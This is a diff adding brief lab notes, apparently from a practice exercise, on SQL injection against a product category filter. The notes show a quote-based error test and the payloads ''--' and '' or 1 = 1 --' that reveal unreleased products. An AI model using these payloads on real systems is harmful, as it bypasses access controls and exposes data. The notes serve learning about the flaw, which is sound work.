@@ -1,0 +1,18 @@
+SQL injection product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End Goal: To find all the unreleased and released products
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+-- gives all gitf category items 
+
+SELECT * FROM products WHERE category = "'"
+
+-- gives error as invalid request
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+SELECT * FROM products WHERE category = '' or 1 = 1 --' AND released =1
+-- we get all the items 
